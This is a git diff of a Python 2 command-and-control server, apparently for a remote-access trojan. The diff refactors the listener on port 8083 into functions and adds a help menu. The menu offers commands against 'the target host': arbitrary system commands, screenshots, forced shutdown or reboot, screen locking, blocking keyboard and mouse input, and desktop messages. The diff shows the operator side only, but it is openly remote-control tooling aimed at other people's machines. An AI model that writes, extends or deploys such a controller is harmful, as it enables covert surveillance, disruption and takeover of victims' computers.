@@ -9,12 +9,17 @@ import threading
  
 bind_ip = '0.0.0.0'
 bind_port = 8083
- 
-server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-server.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR, 1)
-server.bind((bind_ip, bind_port))
-server.listen(5)
-print '[+] Listening on %s:%d' % (bind_ip, bind_port)
+
+
+# init the server
+def setup():
+    help()
+    server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+    server.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR, 1)
+    server.bind((bind_ip, bind_port))
+    server.listen(5)
+    print '[+] Listening on %s:%d' % (bind_ip, bind_port)
+    return server
 
 # recv the client screenshot
 def recvFile(client_socket):
@@ -52,11 +57,32 @@ def handle_client(client_socket):
         except:
             print "Error!"
 
-
-while True:
-    client, addr = server.accept()
-    print '[+] Accept connection from: %s:%d' % (addr[0], addr[1])
+# this is the help
+def help():
+    print "====================================================================="
+    print "Usage:"
+    print "\tshutdown      --shutdowm the target host after 10s."
+    print "\treboot        --reboot the target host after 10s."
+    print "\tcancel        --cancel shutdown or reboot."
+    print "\tscreenshot    --screenshot the target host."
+    print "\tlock          --lock the target host."
+    print "\tmouse         --move the mouse the the location of (0,0)."
+    print "\tblockinput    --lock the target's keyboard and mouse in 5s."
+    print "\t$some cmd     --run the system commend."
+    print "\t@some message   --send a message to the target's desktop."
+    print "Author: s0nnet"
+    print "Email: s0nnet@qq.com"
+    print "Update: 2015/6/24"
+    print "======================================================================"
     
-    # spin up our client thread to handle incoming data
-    client_handler = threading.Thread(target=handle_client, args=(client,))
-    client_handler.start()
+
+
+if __name__ == "__main__":
+    server = setup()
+    while True:
+        client, addr = server.accept()
+        print '[+] Accept connection from: %s:%d' % (addr[0], addr[1])
+    
+        # spin up our client thread to handle incoming data
+        client_handler = threading.Thread(target=handle_client, args=(client,))
+        client_handler.start()
